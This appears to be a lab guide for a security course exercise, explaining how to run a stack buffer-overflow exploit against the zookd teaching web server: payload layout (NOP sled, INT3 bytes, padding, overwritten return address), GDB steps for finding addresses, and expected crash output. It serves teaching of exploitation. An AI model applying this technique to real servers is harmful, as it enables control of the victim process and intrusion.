# Exploit Testing Instructions

## Files Created

### 1. `exploit-2.py` ‚úì
**Purpose:** Exercise 2 - Crash the web server using buffer overflow

**Key Features:**
- Uses exact addresses from your GDB session
- `pn[]` buffer: `0x7ffdc103fa40`
- Saved RIP: `0x7ffdc1040268`
- Distance: 2088 bytes
- CWD length: 48 bytes
- Padding needed: 2040 bytes

**Payload Structure:**
```
[100 bytes NOP sled]
[50 bytes INT3 (breakpoint)]
[1890 bytes padding ('A')]
[8 bytes fake RBP ('B')]
[8 bytes new RIP (0x7ffdc103faa4)]
Total: 2056 bytes
```

### 2. `test_exploit.sh` ‚úì
**Purpose:** Quick test script to run exploit and check results

### 3. `DEMONSTRATION_GUIDE.md` ‚úì (Updated)
**Purpose:** Updated with correct GDB sequence
- Now includes the `next` twice step
- Shows uninitialized vs initialized pn buffer
- Correct addresses from your system

---

## How to Test the Exploit

### Option 1: Quick Test (Recommended)

You currently have the server running in GDB. Let's quit GDB first and run a clean test:

1. **In your GDB terminal, quit:**
```bash
(gdb) quit
A debugging session is active.
Quit anyway? (y or n) y
```

2. **Kill any remaining zookd processes:**
```bash
pkill zookd
```

3. **Start the server cleanly:**
```bash
./zookd 8080 &
```

4. **Run the exploit:**
```bash
./exploit-2.py localhost 8080
```

5. **Check the terminal where zookd is running**
Look for:
```
Child process XXXX terminated incorrectly, receiving signal 11
```

6. **Check kernel logs:**
```bash
dmesg | tail -5
```

Look for something like:
```
zookd[XXXX]: segfault at 7ffdc103faa4 ip 00007ffdc103faa4 sp 00007ffdc1040270
```

---

### Option 2: Using the Test Script

```bash
./test_exploit.sh
```

This will:
- Check if server is running (start if not)
- Run the exploit
- Show crash message
- Display kernel logs

---

## Expected Output

### From exploit-2.py:
```
[*] No shellcode.bin found, using INT3 for crash test
[*] Exploit Information:
[*] ==================
[*] pn[] buffer address:    0x7ffdc103fa40
[*] Saved RIP address:      0x7ffdc1040268
[*] Distance to RIP:        2088 bytes
[*] CWD length:             48 bytes
[*] Padding needed:         2040 bytes
[*]
[*] Payload breakdown:
[*]   NOP sled:             100 bytes
[*]   Shellcode:            50 bytes
[*]   Padding (A's):        1890 bytes
[*]   Fake RBP (B's):       8 bytes
[*]   New RIP:              8 bytes
[*]   --------------------------------
[*]   Total payload:        2056 bytes
[*]
[*] Target address (RIP):   0x7ffdc103faa4
[*]   (pn buffer + 100 for NOP sled)
[*]
[*] HTTP request size: 2075 bytes
[*]
[!] Sending exploit...
[!] Server should crash with 'Child process terminated incorrectly, receiving signal 11'
[!]
Connecting to localhost:8080...
Connected, sending request...
Request sent, waiting for reply...
```

### From zookd output:
```
Child process 12345 terminated incorrectly, receiving signal 11
```

### From dmesg:
```
[timestamp] zookd[12345]: segfault at 7ffdc103faa4 ip 00007ffdc103faa4 sp 00007ffdc1040270 error 15
```

---

## Understanding the Results

### Signal 11 (SIGSEGV)
- This is a **segmentation fault**
- Means the program tried to access invalid memory
- **Success!** You've overwritten the return address

### The Crash Address
If you see `ip 00007ffdc103faa4` in dmesg:
- `ip` = instruction pointer (RIP register)
- `0x7ffdc103faa4` = our target address (pn buffer + 100)
- This proves we **control the instruction pointer!**

### Error Code 15
- Attempted to execute code from a non-executable page
- Or attempted to execute invalid instructions (INT3 = breakpoint)

---

## Troubleshooting

### If Server Doesn't Crash:

1. **Check addresses match:**
   - Your addresses might be different each run (ASLR)
   - Re-run GDB to get current addresses
   - Update `exploit-2.py` lines 21-22 with new addresses

2. **Check payload size:**
   - Verify CWD length is still 48 bytes
   - Run: `pwd | tr -d '\n' | wc -c`

3. **Server might be compiled differently:**
   - Make sure you're running `./zookd` (not `zookd-exstack` or `zookd-nxstack`)

### If Connection Refused:
```bash
# Check if server is running
pgrep zookd

# If not, start it:
./zookd 8080 &
```

### If You Get a Different Error:
- The exploit might be working but crashing differently
- Check `dmesg | tail -10` for segfault info
- The important part is "signal 11" = SIGSEGV

---

## Next Steps

### ‚úÖ Exercise 2 Complete
You've successfully:
- Identified the vulnerability
- Calculated exact offsets
- Crafted a payload
- Crashed the server
- Proven you control RIP

### üìù For Your Report:
Include:
1. GDB output showing addresses
2. Exploit payload structure
3. Screenshot of crash message
4. dmesg output showing segfault
5. Explanation of how overflow works

### üéØ Moving to Exercise 3:
Next you'll:
1. Modify `shellcode.S` to unlink a file
2. Compile it to `shellcode.bin`
3. Use it with `exploit-2.py`

---

## Important Notes

### ASLR (Address Space Layout Randomization)
Your addresses (`0x7ffdc103fa40`, etc.) are **specific to your current run**.

If you:
- Restart the server
- Reboot your machine  
- The addresses will likely change

**Solution:** Always use GDB to find current addresses before running exploit.

### For Demonstration:
1. Use GDB to find addresses (show this live)
2. Update exploit-2.py with those addresses
3. Run the exploit
4. Show the crash

This demonstrates that you understand the vulnerability AND can exploit it!

---

## Quick Commands Reference

```bash
# Start server
./zookd 8080 &

# Run exploit
./exploit-2.py localhost 8080

# Check crash
dmesg | tail -5

# Kill server
pkill zookd

# Find addresses (in GDB)
gdb -p $(pgrep zookd)
(gdb) set follow-fork-mode child
(gdb) break http_serve
(gdb) continue
# (curl localhost:8080/test in another terminal)
(gdb) print &pn
(gdb) info frame
```

---

**Ready to test? Exit GDB, kill the server, and run the exploit!** üöÄ
